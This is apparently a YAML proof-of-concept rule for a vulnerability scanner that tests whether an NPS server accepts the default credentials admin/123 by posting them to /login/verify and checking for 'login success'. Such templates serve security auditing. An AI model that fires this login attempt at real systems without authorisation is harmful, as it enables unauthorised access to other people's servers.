name: poc-yaml-nps-default-password
rules:
  - method: POST
    path: /login/verify
    body: username=admin&password=123
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"login success")
